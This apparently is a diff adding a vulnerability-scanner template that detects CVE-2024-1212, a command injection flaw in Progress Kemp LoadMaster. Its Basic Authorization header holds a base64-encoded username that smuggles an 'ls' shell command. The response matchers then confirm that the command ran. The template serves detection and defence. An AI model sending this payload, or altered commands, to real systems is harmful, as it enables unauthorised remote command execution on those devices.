@@ -1,0 +1,31 @@
+id: poc-yaml-progress-kemp-loadmaster-command-injection
+
+info:
+  name: Progress Kemp LoadMaster Command Injection (CVE-2024-1212)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: CVE-2024-1212
+  description: |
+    Detects a command injection vulnerability in Progress Kemp LoadMaster systems.
+
+http:
+  - method: GET
+    path:
+      - "/access/set?param=enableapi&value=1"
+    headers:
+      Authorization: Basic JztsczsnOmRvZXNub3RtYXR0ZXI=
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "bin"
+          - "mnt"
+        part: body
+      - type: word
+        words:
+          - "WWW-Authenticate: Basic"
+        part: header
